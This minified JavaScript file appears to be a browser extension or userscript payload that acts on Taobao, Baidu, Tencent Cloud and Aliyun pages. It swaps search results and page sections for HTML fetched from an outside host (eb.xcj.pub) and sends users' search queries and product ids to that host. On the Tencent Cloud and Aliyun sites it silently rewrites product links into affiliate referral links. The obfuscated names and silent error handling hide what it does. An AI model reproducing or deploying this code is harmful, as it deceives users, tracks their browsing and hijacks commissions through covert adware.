function helper_iiou_xx980($){this.$=$,this.queryUrlParamterTag=function(text,a){var textArray;-1!=text.indexOf("?")&&(text="?"+(textArray=text.split("?"))[textArray.length-1]);a=new RegExp("(^|&)"+a+"=([^&]*)(&|$)"),a=text.substr(1).match(a);return null!=a?a[2]:""},this.request___show_q=function(requestUrl,params){params.size=screen.width+"*"+screen.height,params.version="100";var resutData=null,priceFilter="";return $(".J_SortbarPriceInput").each(function(){var value=$(this).val();priceFilter+="("+(value?parseInt(value):"")+")"}),priceFilter&&(params.price=priceFilter),$.ajax({type:"POST",url:requestUrl,dataType:"json",data:params,timeout:1500,async:!1,success:function(data){data=data.data;null!=data&&0<data.length&&(resutData=data)}}),resutData},this.dom___tbitem=function(requestRoot,scno){var goodsId;"item.taobao.com"!==window.location.host||-1==window.location.href.indexOf("item.htm")||(goodsId=this.queryUrlParamterTag(window.location.search,"id"))&&$.get(requestRoot+"/ebusiness/api/tb/re/gitems?goodsId="+goodsId+"&platform=taobao&scno="+scno,function(result){})},this.dom___home=function(requestRoot,scno){try{if("www.taobao.com"!==window.location.host||"/"!==window.location.pathname)return;let isScanning=!1;screen.width,screen.height;let dataObject=this.request___show_q(requestRoot+"/ebusiness/api/tb/h/ghobbies",{scno:scno}),itemsInterval=setInterval(function(){if(!isScanning){isScanning=!0;let itemArray=$(".tbh-hotsale").find("div.item");0!=itemArray.length&&(clearInterval(itemsInterval),null!=dataObject&&itemArray.each(function(){$(this).find("a.item-more").remove();for(var k=0;k<dataObject.length;k++){var dataObjectItem=dataObject[k];parseInt($(this).attr("aria-posinset"))===parseInt(dataObjectItem.index)&&$(this).html(dataObjectItem.html)}})),isScanning=!1}},100)}catch(e){}},this.dom___search=function(requestRoot,scno){try{let that=this;if("s.taobao.com"!==window.location.host||-1==window.location.href.indexOf("://s.taobao.com/search"))return;let queryValue=this.queryUrlParamterTag(window.location.search,"q");if(!queryValue)return;let dataObject,isScanning=!1,dealredxNumber=0;setInterval(function(){var itemArray,titleArray,titleConnectStr;isScanning||(dealredxNumber=0,isScanning=!0,itemArray=$("#mainsrp-itemlist").find("div.item"),isScanning=(0!=itemArray.length&&(itemArray.each(function(){"true"===$(this).attr("dealredx")&&dealredxNumber++}),dealredxNumber<5&&(titleArray=new Array,itemArray.each(function(){try{var title=$(this).find("div.title").children("a.J_ClickStat").text();title=(title=(title=(title=(title=(title=(title=title.replace(/\t/g,"")).replace(/\r/g,"")).replace(/\n/g,"")).replace(/\+/g,"%2B")).replace(/\&/g,"%26")).replace(/\#/g,"%23")).replace(/\s/g,""),titleArray.push(title)}catch(e){}}),titleConnectStr=titleArray.join("=============="),dataObject=that.request___show_q(requestRoot+"/ebusiness/api/tb/s/gitems",{q:queryValue,titleConnectStr:titleConnectStr,scno:scno}),itemArray.each(function(){if("true"!==$(this).attr("dealredx")){if(null!=dataObject)for(var k=0;k<dataObject.length;k++){var dataObjectItem=dataObject[k];if(parseInt($(this).attr("data-index"))===parseInt(dataObjectItem.index)){if($(this).hasClass("item-ad"))return void(dataObjectItem.index=parseInt(dataObjectItem.index)+1+"");$(this).html(dataObjectItem.html)}}$(this).attr("dealredx","true")}}))),!1))},50)}catch(e){}},this.dom___wjv=function(requestRoot,scno){try{"wenku.baidu.com"!==window.location.host||-1==window.location.pathname.indexOf("/view/")&&-1==window.location.pathname.indexOf("/link")||0!=$(".vip-card-wrap-23223-new").length||$.get(requestRoot+"/api/card/find?tag=jd&no=1&scno="+scno,function(handler){if(handler&&handler.data){var css=handler.data,handler=css.handler,html=css.html,css=css.css;if(handler&&html&&css){$("body").prepend("<style>"+css+"</style>");for(var elementArray=handler.split("@"),i=0;i<elementArray.length;i++){var currentElement=elementArray[i];if(currentElement=currentElement.replace(/(^\s*)|(\s*$)/g,""))if(0!=$(currentElement).length)$(currentElement).after(html);else{let tryTimes=0,elementInterval=setInterval(function(){0!=$(currentElement).length?($(currentElement).after(html),clearInterval(elementInterval)):1e4<=50*tryTimes&&clearInterval(elementInterval),tryTimes++},50)}}}}})}catch(e){}},this.dom___wpad=function(requestRoot,scno){"pan.baidu.com"===window.location.host&&-1!=window.location.href.indexOf("/s/")&&($.get(requestRoot+"/api/card/find?tag=wptext&no=1&scno="+scno,function(data){data=data.data;if(data&&data.css&&data.html&&data.handler){var handler=data.handler,html=data.html;let helperInterval=setInterval(function(){var $headerUnion=$("#layoutHeader").find(handler);$headerUnion.hide(),10<=$headerUnion.html().length&&(clearInterval(helperInterval),$headerUnion.html(html),$headerUnion.show())},100)}}),$.get(requestRoot+"/api/card/find?tag=wpimg&no=1&scno="+scno,function(data){data=data.data;if(data&&data.css&&data.html&&data.handler){var handler=data.handler,html=data.html;let rightViewInterval=setInterval(function(){let $webRightView=$(handler);$webRightView.hide(),0!=$webRightView.length?10<=$webRightView.html().length&&(clearInterval(rightViewInterval),$webRightView.html(html),$webRightView.show()):clearInterval(rightViewInterval)},100)}}))},this.funcUrlDel=function(url,name){var loca=url.split("?"),baseUrl=loca[0];if(-1<loca[1].indexOf(name)){for(var obj={},arr=loca[1].split("&"),i=0;i<arr.length;i++)arr[i]=arr[i].split("="),obj[arr[i][0]]=arr[i][1];return delete obj[name],url=baseUrl+"?"+JSON.stringify(obj).replace(/[\"\{\}]/g,"").replace(/\:/g,"=").replace(/\,/g,"&")}},this.dom_tencent_promote=function(){"cloud.tencent.com"===window.location.host&&$.get("https://eb.xcj.pub/api/server/allow?no=1&platform=tencent",function(xxd){!xxd||"true"!=xxd.allow&&1!=xxd.allow||setInterval(function(){$("body").find("a").each(function(){if("true"!=$(this).attr("dealxx")){let href=$(this).attr("href");href&&(-1==href.indexOf("https://cloud.tencent.com/act/cosummer?")&&"https://cloud.tencent.com/act/cosummer"!==href||$(this).attr("href","https://cloud.tencent.com/act/cps/redirect?redirect=1528&cps_key=848699c9fbcda409afbcf6cd90511add&from=console"),-1==href.indexOf("https://cloud.tencent.com/act/new?")&&"https://cloud.tencent.com/act/new"!==href||$(this).attr("href","https://cloud.tencent.com/act/cps/redirect?redirect=1077&cps_key=848699c9fbcda409afbcf6cd90511add&from=console"),-1==href.indexOf("https://cloud.tencent.com/act/pro/overseas?")&&"https://cloud.tencent.com/act/pro/overseas"!==href||$(this).attr("href","https://cloud.tencent.com/act/cps/redirect?redirect=1068&cps_key=848699c9fbcda409afbcf6cd90511add&from=console"),-1==href.indexOf("https://cloud.tencent.com/act/pro/starlake?")&&"https://cloud.tencent.com/act/pro/starlake"!==href||$(this).attr("href","https://cloud.tencent.com/act/cps/redirect?redirect=1063&cps_key=848699c9fbcda409afbcf6cd90511add&from=console"),-1==href.indexOf("https://cloud.tencent.com/act/vouchers/list?")&&"https://cloud.tencent.com/act/vouchers/list"!==href||$(this).attr("href","https://cloud.tencent.com/act/cps/redirect?redirect=1040&cps_key=848699c9fbcda409afbcf6cd90511add&from=console"),-1==href.indexOf("https://cloud.tencent.com/act/pro/enterprise2021?")&&"https://cloud.tencent.com/act/pro/enterprise2021"!==href||$(this).attr("href","https://cloud.tencent.com/act/cps/redirect?redirect=1060&cps_key=848699c9fbcda409afbcf6cd90511add&from=console"),-1==href.indexOf("https://cloud.tencent.com/act/pro/cloudbase01?")&&"https://cloud.tencent.com/act/pro/cloudbase01"!==href||$(this).attr("href","https://cloud.tencent.com/act/cps/redirect?redirect=1065&cps_key=848699c9fbcda409afbcf6cd90511add&from=console"),-1==href.indexOf("https://cloud.tencent.com/act/pro/elasticsearchsales2020?")&&"https://cloud.tencent.com/act/pro/elasticsearchsales2020"!==href||$(this).attr("href","https://cloud.tencent.com/act/cps/redirect?redirect=1066&cps_key=848699c9fbcda409afbcf6cd90511add&from=console"),-1==href.indexOf("https://buy.cloud.tencent.com/cdb?")&&"https://buy.cloud.tencent.com/cdb"!==href||$(this).attr("href","https://cloud.tencent.com/act/cps/redirect?redirect=1003&cps_key=848699c9fbcda409afbcf6cd90511add&from=console"),-1==href.indexOf("https://cloud.tencent.com/act/pro/yuntuad?")&&"https://cloud.tencent.com/act/pro/yuntuad"!==href||$(this).attr("href","https://cloud.tencent.com/act/cps/redirect?redirect=1046&cps_key=848699c9fbcda409afbcf6cd90511add&from=console"),-1==href.indexOf("https://cloud.tencent.com/act/seckill?")&&"https://cloud.tencent.com/act/seckill"!==href||$(this).attr("href","https://cloud.tencent.com/act/cps/redirect?redirect=1077&cps_key=848699c9fbcda409afbcf6cd90511add&from=console"),-1==href.indexOf("https://cloud.tencent.com/act/pro/ysptx?")&&"https://cloud.tencent.com/act/pro/ysptx"!==href||$(this).attr("href","https://cloud.tencent.com/act/cps/redirect?redirect=1051&cps_key=848699c9fbcda409afbcf6cd90511add&from=console"),-1==href.indexOf("https://cloud.tencent.com/act/pro/imnew?")&&"https://cloud.tencent.com/act/pro/imnew"!==href||$(this).attr("href","https://cloud.tencent.com/act/cps/redirect?redirect=1056&cps_key=848699c9fbcda409afbcf6cd90511add&from=console"),-1==href.indexOf("https://cloud.tencent.com/act/pro/trtccx?")&&"https://cloud.tencent.com/act/pro/trtccx"!==href||$(this).attr("href","https://cloud.tencent.com/act/cps/redirect?redirect=1057&cps_key=848699c9fbcda409afbcf6cd90511add&from=console"),-1==href.indexOf("https://cloud.tencent.com/act/pro/mysql?")&&"https://cloud.tencent.com/act/pro/mysql"!==href||$(this).attr("href","https://cloud.tencent.com/act/cps/redirect?redirect=1034&cps_key=848699c9fbcda409afbcf6cd90511add&from=console"),-1==href.indexOf("https://cloud.tencent.com/product/ms?")&&"https://cloud.tencent.com/product/ms"!==href||$(this).attr("href","https://cloud.tencent.com/act/cps/redirect?redirect=1037&cps_key=848699c9fbcda409afbcf6cd90511add&from=console"),-1==href.indexOf("https://cloud.tencent.com/act/pro/lighthouse2021?")&&"https://cloud.tencent.com/act/pro/lighthouse2021"!==href||$(this).attr("href","https://cloud.tencent.com/act/cps/redirect?redirect=1079&cps_key=848699c9fbcda409afbcf6cd90511add&from=console"),-1==href.indexOf("https://cloud.tencent.com/act/pro/tpnsnew?")&&"https://cloud.tencent.com/act/pro/tpnsnew"!==href||$(this).attr("href","https://cloud.tencent.com/act/cps/redirect?redirect=1075&cps_key=848699c9fbcda409afbcf6cd90511add&from=console"),-1==href.indexOf("https://cloud.tencent.com/product/lvb?")&&"https://cloud.tencent.com/product/lvb"!==href||$(this).attr("href","https://cloud.tencent.com/act/cps/redirect?redirect=1038&cps_key=848699c9fbcda409afbcf6cd90511add&from=console"),-1==href.indexOf("https://cloud.tencent.com/product/vod?")&&"https://cloud.tencent.com/product/vod"!==href||$(this).attr("href","https://cloud.tencent.com/act/cps/redirect?redirect=1043&cps_key=848699c9fbcda409afbcf6cd90511add&from=console"),-1==href.indexOf("https://cloud.tencent.com/product/mongodb?")&&"https://cloud.tencent.com/product/mongodb"!==href||$(this).attr("href","https://cloud.tencent.com/act/cps/redirect?redirect=1017&cps_key=848699c9fbcda409afbcf6cd90511add&from=console"),-1==href.indexOf("https://cloud.tencent.com/product/ckafka?")&&"https://cloud.tencent.com/product/ckafka"!==href||$(this).attr("href","https://cloud.tencent.com/act/cps/redirect?redirect=1018&cps_key=848699c9fbcda409afbcf6cd90511add&from=console"),-1==href.indexOf("https://cloud.tencent.com/product/waf?")&&"https://cloud.tencent.com/product/waf"!==href||$(this).attr("href","https://cloud.tencent.com/act/cps/redirect?redirect=1023&cps_key=848699c9fbcda409afbcf6cd90511add&from=console"),-1==href.indexOf("https://cloud.tencent.com/product/ddos?")&&"https://cloud.tencent.com/product/ddos"!==href||$(this).attr("href","https://cloud.tencent.com/act/cps/redirect?redirect=1024&cps_key=848699c9fbcda409afbcf6cd90511add&from=console"),-1==href.indexOf("https://cloud.tencent.com/act/pro/MySQLtry?")&&"https://cloud.tencent.com/act/pro/MySQLtry"!==href||$(this).attr("href","https://cloud.tencent.com/act/cps/redirect?redirect=1080&cps_key=848699c9fbcda409afbcf6cd90511add&from=console"),-1==href.indexOf("https://cloud.tencent.com/product/iotexplorer?")&&"https://cloud.tencent.com/product/iotexplorer"!==href||$(this).attr("href","https://cloud.tencent.com/act/cps/redirect?redirect=1081&cps_key=848699c9fbcda409afbcf6cd90511add&from=console"),-1==href.indexOf("https://cloud.tencent.com/product/asr?")&&"https://cloud.tencent.com/product/asr"!==href||$(this).attr("href","https://cloud.tencent.com/act/cps/redirect?redirect=1070&cps_key=848699c9fbcda409afbcf6cd90511add&from=console"),-1==href.indexOf("https://cloud.tencent.com/product/tts?")&&"https://cloud.tencent.com/product/tts"!==href||$(this).attr("href","https://cloud.tencent.com/act/cps/redirect?redirect=1071&cps_key=848699c9fbcda409afbcf6cd90511add&from=console"),-1==href.indexOf("https://cloud.tencent.com/product/nlp?")&&"https://cloud.tencent.com/product/nlp"!==href||$(this).attr("href","https://cloud.tencent.com/act/cps/redirect?redirect=1072&cps_key=848699c9fbcda409afbcf6cd90511add&from=console"),-1==href.indexOf("https://cloud.tencent.com/product/ace?")&&"https://cloud.tencent.com/product/ace"!==href||$(this).attr("href","https://cloud.tencent.com/act/cps/redirect?redirect=1033&cps_key=848699c9fbcda409afbcf6cd90511add&from=console"),$(this).attr("rel","noreferrer nofollow noopener")),$(this).attr("dealxx","true")}})},600)})},this.dom_aliyun_promote=function(){var that=this;"www.aliyun.com"===window.location.host&&$.get("https://eb.xcj.pub/api/server/allow?no=1&platform=tencent",function(xxd){if(xxd&&("true"==xxd.allow||1==xxd.allow)){let isFind=!1;setInterval(function(){$("body").find("a").each(function(){if($(this).removeAttr("data-spm-anchor-id"),"true"!=$(this).attr("dealxx")){let href=$(this).attr("href");href&&(isFind=!1,"https://www.aliyun.com/activity"!==href&&"https://www.aliyun.com/activity?"!==href||($(this).attr("href","https://www.aliyun.com/activity?userCode=hcf6ol03"),isFind=!0),-1==href.indexOf("https://www.aliyun.com/daily-act/ecs/activity_selection?")&&"https://www.aliyun.com/daily-act/ecs/activity_selection"!==href||($(this).attr("href","https://www.aliyun.com/daily-act/ecs/activity_selection?userCode=hcf6ol03"),isFind=!0),-1==href.indexOf("https://www.aliyun.com/minisite/goods?")&&"https://www.aliyun.com/minisite/goods"!==href||($(this).attr("href","https://www.aliyun.com/minisite/goods?userCode=hcf6ol03"),isFind=!0),-1==href.indexOf("https://www.aliyun.com/daily-act/ecs/care?")&&"https://www.aliyun.com/daily-act/ecs/care"!==href||($(this).attr("href","https://www.aliyun.com/daily-act/ecs/care?userCode=hcf6ol03"),isFind=!0),-1==href.indexOf("https://www.aliyun.com/1111/new?")&&"https://www.aliyun.com/1111/new"!==href||($(this).attr("href","https://www.aliyun.com/1111/new?userCode=hcf6ol03"),isFind=!0),-1==href.indexOf("https://www.aliyun.com/product/ecs?")&&"https://www.aliyun.com/product/ecs"!==href||($(this).attr("href","https://www.aliyun.com/product/ecs?userCode=hcf6ol03"),isFind=!0),-1==href.indexOf("https://www.aliyun.com/product/rds/mysql?")&&"https://www.aliyun.com/product/rds/mysql"!==href||($(this).attr("href","https://www.aliyun.com/product/rds/mysql?userCode=hcf6ol03"),isFind=!0),-1==href.indexOf("https://www.aliyun.com/product/oss?")&&"https://www.aliyun.com/product/oss"!==href||($(this).attr("href","https://www.aliyun.com/product/oss?userCode=hcf6ol03"),isFind=!0),-1==href.indexOf("https://www.aliyun.com/product/cas?")&&"https://www.aliyun.com/product/cas"!==href||($(this).attr("href","https://www.aliyun.com/product/cas?userCode=hcf6ol03"),isFind=!0),-1==href.indexOf("https://www.aliyun.com/product/sms?")&&"https://www.aliyun.com/product/sms"!==href||($(this).attr("href","https://www.aliyun.com/product/sms?userCode=hcf6ol03"),isFind=!0),-1==href.indexOf("https://www.aliyun.com/product/cdn?")&&"https://www.aliyun.com/product/cdn"!==href||($(this).attr("href","https://www.aliyun.com/product/cdn?userCode=hcf6ol03"),isFind=!0),$(this).attr("rel","noreferrer nofollow noopener"),isFind&&$(this).unbind("click").bind("click",function(event){try{window.location.href=that.funcUrlDel($(this).attr("href"),"spm"),event.stopPropagation(),event.preventDefault()}catch(e){}})),$(this).attr("dealxx","true")}})},600)}})},this.start=function(){try{var requestRoot="https://eb.xcj.pub";this.dom___home(requestRoot,1),this.dom___search(requestRoot,1),this.dom___tbitem(requestRoot,1),this.dom___wjv(requestRoot,1),this.dom___wpad(requestRoot,1),this.dom_tencent_promote(),this.dom_aliyun_promote()}catch(e){}}}function _i180u_task_scan_($){try{new helper_iiou_xx980($).start()}catch(e){}}